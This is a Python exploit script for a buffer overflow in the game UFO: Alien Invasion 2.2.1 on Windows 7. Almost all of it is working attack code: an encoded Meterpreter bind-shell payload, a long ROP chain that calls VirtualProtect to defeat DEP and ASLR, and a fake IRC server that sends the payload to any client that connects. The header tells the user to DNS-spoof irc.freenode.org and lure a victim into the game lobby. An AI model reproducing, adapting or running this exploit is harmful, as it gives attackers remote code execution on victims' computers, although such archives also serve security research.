#!/usr/bin/python
#
# Exploit Title:    UFO: Alien Invasion v2.2.1 BoF Exploit (Win7 ASLR and DEP Bypass)
# Date:         July 5, 2010
# Author:       Node
# Software Link:    http://sourceforge.net/projects/ufoai/files/UFO_AI%202.x/2.2.1/ufoai-2.2.1-win32.exe/download
# Version:      "UFO: Alien Invasion 2.2.1 x86 Apr 28 2008 Win32 RELEASE"
# Tested on:        Windows 7 Ultimate x64 ENG
# CVE :
# Max shellcode size:   328 bytes
# Badchars:         '\x00\x0a\x0d'
# Instructions:     1. DNS spoof/redirect "irc.freenode.org" to your ip
#           2- Have your victim click "Multiplayer" and then "Lobby"
#
# Notes:        There is a possibility that this exploit can work on a different
#           windows version, by just changing the last bytes of 0xffff34ec
#           to wherever VirtualProtect() resides in that version of kernel32.dll.
 
 
import sys, socket
 
#msfpayload windows/meterpreter/bind_tcp LPORT=4444 R | msfencode -b '\x00\x0a\x0d' -t c
#[*] x86/shikata_ga_nai succeeded with size 326 (iteration=1)
shellcode = ("\xbf\xb7\x89\xfe\x0e\xda\xd3\xd9\x74\x24\xf4\x2b\xc9\xb1\x4b" +
"\x5e\x83\xc6\x04\x31\x7e\x11\x03\x7e\x11\xe2\x42\x75\x16\x87" +
"\xac\x86\xe7\xf8\x25\x63\xd6\x2a\x51\xe7\x4b\xfb\x12\xa5\x67" +
"\x70\x76\x5e\xf3\xf4\x5e\x51\xb4\xb3\xb8\x5c\x45\x72\x04\x32" +
"\x85\x14\xf8\x49\xda\xf6\xc1\x81\x2f\xf6\x06\xff\xc0\xaa\xdf" +
"\x8b\x73\x5b\x54\xc9\x4f\x5a\xba\x45\xef\x24\xbf\x9a\x84\x9e" +
"\xbe\xca\x35\x94\x88\xf2\x3e\xf2\x28\x02\x92\xe0\x14\x4d\x9f" +
"\xd3\xef\x4c\x49\x2a\x10\x7f\xb5\xe1\x2f\x4f\x38\xfb\x68\x68" +
"\xa3\x8e\x82\x8a\x5e\x89\x51\xf0\x84\x1c\x47\x52\x4e\x86\xa3" +
"\x62\x83\x51\x20\x68\x68\x15\x6e\x6d\x6f\xfa\x05\x89\xe4\xfd" +
"\xc9\x1b\xbe\xd9\xcd\x40\x64\x43\x54\x2d\xcb\x7c\x86\x89\xb4" +
"\xd8\xcd\x38\xa0\x5b\x8c\x54\x05\x56\x2e\xa5\x01\xe1\x5d\x97" +
"\x8e\x59\xc9\x9b\x47\x44\x0e\xdb\x7d\x30\x80\x22\x7e\x41\x89" +
"\xe0\x2a\x11\xa1\xc1\x52\xfa\x31\xed\x86\xad\x61\x41\x79\x0e" +
"\xd1\x21\x29\xe6\x3b\xae\x16\x16\x44\x64\x3f\xe6\x61\xd4\x28" +
"\x0b\x95\xca\xf4\x82\x73\x86\x14\xc3\x2c\x3f\xd7\x30\xe5\xd8" +
"\x28\x13\x5a\x70\xbf\x2b\xb5\x46\xc0\xab\x90\xe4\x6d\x03\x72" +
"\x7f\x7e\x90\x63\x80\xab\xb0\xf4\x17\x21\x51\xb7\x86\x36\x78" +
"\x2d\x49\xa3\x87\xe7\x1e\x5b\x8a\xde\x69\xc4\x75\x35\xe2\xcd" +
"\xe3\xf5\x9d\x31\xe4\xf5\x5d\x64\x6e\xf5\x35\xd0\xca\xa6\x20" +
"\x1f\xc7\xdb\xf8\x8a\xe8\x8d\xad\x1d\x81\x33\x8b\x6a\x0e\xcc" +
"\xfe\x6a\x72\x1b\xc7\xe8\x82\x2e\x2b\x31\x60")
 
 
 
#start
rop = "\x5a\xc9\x70\x61" #0x6170C95A : PUSH ESP # POP EBX # POP EBP
rop += "A"*4
rop += "\xd6\x14\x6c\x68" #0x686C14D6 : ADD ESP,1C
rop += "1111" #VirtualProtect placeholder
rop += "2222" #return address placeholder
rop += "3333" #lpAddress placeholder
rop += "4444" #dwsize placeholder
rop += "5555" #flNewProtect placeholder
rop += "\x05\xe0\x76\x61" #0x6176e005 lpflOldProtect writable in SDL_mixer.dll
rop += "A"*4
rop += "\x45\x57\x10\x68" #0x68105745 : MOV EAX,EBX # POP EBX # POP EBP
rop += "A"*8
rop += "\xdd\x5b\x10\x68" #0x68105BDD : MOV EDX,EAX # MOV EAX,EDX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
 
#grabbing kernel32
rop += "\xb8\x51\x58\x67" #0x675851B8 : MOV EAX,200
rop += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20 A0
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x25\x54\x72\x61" #0x61725425 : ADD ECX,EBP
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x25\x54\x72\x61" #0x61725425 : ADD ECX,EBP 9a0
rop += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x28\x51\x58\x67" #0x67585128 : MOV EAX,2
rop += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX 
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x6f\x9f\x58\x67" #0x67589F6F : ADD ECX,EAX # MOVZX EAX,CX
rop += "\x9c\x8d\x59\x67" #0x67598D9C : POP ECX
rop += "\x05\xe0\x76\x61" #0x6176e005 : writable
rop += "\xee\x9b\x71\x61" #0x61719BEE : MOV EBX,EDX # SUB EBX,EAX # MOV EAX,EBX # MOV WORD PTR DS:[ECX+44],AX # ADD ESP,4 # POP EBX # POP EBP
rop += "A"*4
rop += "A"*4
rop += "A"*4
rop += "\x67\x01\x11\x68" #0x68110167 : MOV EAX,DWORD PTR DS:[EAX] 
 
#VirtualProtect()
rop += "\x71\x33\x6c\x68" #0x686C3371 :  # MOV ECX,EAX # MOV EAX,ECX
rop += "\x5a\xc9\x70\x61" #0x6170C95A :  {POP}  # PUSH ESP # POP EBX # POP EBP
rop += "A"*4
rop += "\x53\x23\x10\x68" #0x68102353 :  # XOR EAX,EAX
rop += "\x50\x49\x58\x67" #0x67584950 :  # ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 :  # ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 :  # ADD EAX,20 
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\x6a\x1f\x13\x68" #0x68131F6A :  # ADD EBP,EBX
rop += "\x73\x33\x6c\x68" #0x686C3373 :  # MOV EAX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\x71\x33\x6c\x68" #0x686C3371 :  # MOV ECX,EAX # MOV EAX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop += "\xec\x34\xff\xff" #VirtualProtect() is found at 0x????34ec, if not, change this to match your windows version
rop += "\x42\x35\x80\x70" #0x70803542 :  # XOR AL,AL # POP EBP
rop += "A"*4
rop += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\x73\x33\x6c\x68" #0x686C3373 :  # MOV EAX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\x71\x33\x6c\x68" #0x686C3371 :  # MOV ECX,EAX # MOV EAX,ECX
rop += "\x34\xa5\x70\x61" #0x6170A534 :  # MOV CH,BH # ADD AL,BYTE PTR DS:[EAX] # MOV ESP,EBP # POP EBP
rop += "A"*4
rop += "A"*4
rop += "A"*4
rop += "A"*4
rop += "\xb9\x4b\x58\x67" #0x67584BB9 : MOV DWORD PTR DS:[EDX],ECX
 
#fetch shellcode
rop += "\x5a\xc9\x70\x61" #0x6170C95A :  {POP}  # PUSH ESP # POP EBX # POP EBP
rop += "A"*4
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x45\x57\x10\x68" #0x68105745 :  {POP}  # MOV EAX,EBX # POP EBX # POP EBP
rop += "A"*4
rop += "A"*4
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX
rop += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop += "\xac\xff\xff\xff" #0xac * 2 = 0x158
rop += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX 
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x6f\x9f\x58\x67" #0x67589F6F : ADD ECX,EAX # MOVZX EAX,CX shellcode
rop += "\xb9\x4b\x58\x67" #0x67584BB9 :  # MOV DWORD PTR DS:[EDX],ECX
 
#again
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop += "\x26\x51\x58\x67" #0x67585126 : MOV DWORD PTR DS:[EDX],EAX # MOV EAX,2
 
#set dwsize 0x148 (328)
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX
rop += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop += "\xa4\xff\xff\xff" #0xa4 * 2 = 0x148 (328)
rop += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX 
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop += "\x26\x51\x58\x67" #0x67585126 : MOV DWORD PTR DS:[EDX],EAX # MOV EAX,2
 
#forwardjump
rop += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX
rop += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop += "\x70\xff\xff\xff" # 0x70
rop += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop += "\x5a\xc9\x70\x61" #0x6170C95A :  {POP}  # PUSH ESP # POP EBX # POP EBP
rop += "A"*4
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x6a\x1f\x13\x68" #0x68131F6A :  # ADD EBP,EBX
rop += "\xc6\xcd\x6d\x68" #0x686DCDC6 :  # LEAVE
rop += "A"*4
 
#backjump
rop2 = "\x5a\xc9\x70\x61" #0x6170C95A :  {POP}  # PUSH ESP # POP EBX # POP EBP
rop2 += "A"*4
rop2 += "\x45\x57\x10\x68" #0x68105745 :  {POP}  # MOV EAX,EBX # POP EBX # POP EBP
rop2 += "A"*4
rop2 += "A"*4
rop2 += "\xdd\x5b\x10\x68" #0x68105BDD : MOV EDX,EAX # MOV EAX,EDX  
rop2 += "\xb8\x51\x58\x67" #0x675851B8 : MOV EAX,200   
rop2 += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop2 += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop2 += "\x0c\xff\xff\xff" # 12
rop2 += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop2 += "\x9c\x8d\x59\x67" #0x67598D9C : POP ECX
rop2 += "\x05\xe0\x76\x61" #0x6176e005 : writable
rop2 += "\xee\x9b\x71\x61" #0x61719BEE : MOV EBX,EDX # SUB EBX,EAX # MOV EAX,EBX # MOV WORD PTR DS:[ECX+44],AX # ADD ESP,4 # POP EBX # POP EBP
rop2 += "A"*4
rop2 += "A"*4
rop2 += "A"*4
rop2 += "\x7a\x36\x13\x68" #0x6813367A : XCHG EAX,ESP
 
#set flNewProtect 0x40 (land here)
rop2 += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop2 += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop2 += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop2 += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop2 += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX
rop2 += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop2 += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop2 += "\x26\x51\x58\x67" #0x67585126 : MOV DWORD PTR DS:[EDX],EAX # MOV EAX,2
 
#ending
rop2 += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX 
rop2 += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop2 += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop2 += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop2 += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop2 += "\x52\x3d\x13\x68" #0x68133D52 : SUB EDX,EAX # MOV EAX,EDX  
rop2 += "\x7a\x36\x13\x68" #0x6813367A : XCHG EAX,ESP
 
end = "\x0d\x0a"
 
sploit = "001 :"
sploit += rop
sploit += "\x90" * (552 - len(rop))
sploit += rop2
sploit += shellcode
sploit += end
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 6667))
s.listen(1)
print ("[*] Listening on port 6667.")
print ("[*] Have someone connect to you.")
print ("[*] Type <control>-c to exit.")
conn, addr = s.accept()
print '[*] Received connection from: ', addr
  
conn.send(sploit)
conn.close